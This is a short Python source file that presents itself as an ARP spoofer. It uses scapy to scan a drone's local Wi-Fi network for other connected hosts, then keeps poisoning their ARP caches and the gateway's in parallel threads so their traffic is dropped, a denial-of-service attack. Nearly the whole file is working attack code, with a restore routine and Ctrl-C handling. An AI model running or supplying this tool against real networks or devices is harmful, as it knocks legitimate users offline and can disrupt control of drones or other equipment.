# mac_scan.py
# Rob Churchill
#
# This is an ARP Spoofer that finds all active users of a drone and persistently poisons their ARP, dropping packets
#   and thereby performing DoS.
#
# The spoofer borrows its poison and restore target functions from the threading approach to poisoning
#   proposed by the guy at CodingSec.net (https://codingsec.net/2016/05/arp-cache-poisoning-scapy-using-python/)

from scapy.all import *
import os
import sys, tty, termios
import threading
import signal
from time import sleep
from datetime import datetime
from datetime import timedelta as td

interface='en0'
BASE_IP = '192.168.1.'
gateway_ip = '192.168.1.1'
my_ip = socket.gethostbyname(socket.gethostname())
poisoned_macs = dict()


def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def scan_network():
    unwelcome_macs = dict()
    for i in range(2, 5):
        unwelcome_ip = BASE_IP + str(i)
        if unwelcome_ip != my_ip:
            unwelcome_mac = get_mac(unwelcome_ip)
            if unwelcome_mac:
                unwelcome_macs[unwelcome_ip] = unwelcome_mac
    return unwelcome_macs


def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    # slightly different method using send
    print("> Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    # signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)


def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("> Beginning the ARP poison on IP {} at MAC {}. [CTRL-C to stop]".format(target_ip, target_mac))
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(1)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

            print("> ARP poison attack finished.")
            return


def poison_ips(gateway_ip):
    gateway_mac = get_mac(gateway_ip)
    unwelcome_macs = scan_network()
    print(unwelcome_macs)
    for i in unwelcome_macs:
        if (i in poisoned_macs and poisoned_macs[i] != unwelcome_macs[i]) or i not in poisoned_macs:
            poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,i,unwelcome_macs[i]))
            poison_thread.start()
            poisoned_macs[i] = unwelcome_macs[i]
            sleep(0.2)


def main():
    poison_ips(gateway_ip)
    while True:
        try:
            now = datetime.now()
            if td.total_seconds(now - then) > 5:
                poison_ips(gateway_ip)
            then = now
        except KeyboardInterrupt:
            print("> Ending ARP poisoning attack.")
            return


if __name__ == '__main__':
    main()



